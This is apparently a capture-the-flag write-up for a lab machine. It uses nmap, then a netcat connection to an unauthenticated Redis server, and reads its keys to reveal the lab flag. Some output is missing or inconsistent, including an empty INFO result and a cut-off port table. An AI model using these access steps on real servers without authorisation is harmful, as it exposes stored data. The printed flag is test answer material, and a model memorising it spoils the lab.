With the given IP address, we can start by scanning the machine to see which ports are open and which services are running.

```bash
user in ~ 位 nmap -sV 10.129.54.67                        
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 20:19 -03
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.25 seconds
user in ~ 位 nmap -Pn 10.129.54.67
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 20:19 -03
Nmap scan report for 10.129.54.67 (10.129.54.67)
Host is up (0.20s latency).
All 1000 scanned ports on 10.129.54.67 (10.129.54.67) are closed

Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```

It seems that the machine is blocking ping requests, so i'm going to cheat and scan the redis port directly since the machine has a tag of redis.

```bash
user in ~ 位 nmap -p 6379 10.129.54.67   
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 00:22 -03
Nmap scan report for 10.129.54.67 (10.129.54.67)
Host is up (0.20s latency).

PORT     STATE SERVICE

We can see that the machine is running a redis server, with this information we can try to connect to the server and see if we can get any information from it.

Here is a explanation of how to do it:

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

```bash
nc -vn <target> 6379
```

```bash
Connection to <target> 6379 port [tcp/*] succeeded!
```

Now inside we can try to get some information from the server.

```bash
INFO
```

OUTPUT:
```

```

We can see that the server has 4 keys, we can try to get the keys and see if we can get any information from them.

```bash
KEYS *
```

OUTPUT:
```
*4
$4
flag
$4
stor
$4
numb
$4
temp
```

There we can see the keys, we should try to obtain the value from the flag key.

```bash
GET flag
```

```
$32
03e1d2b376c37ab3f5319922053953eb
```

And there we have the flag.
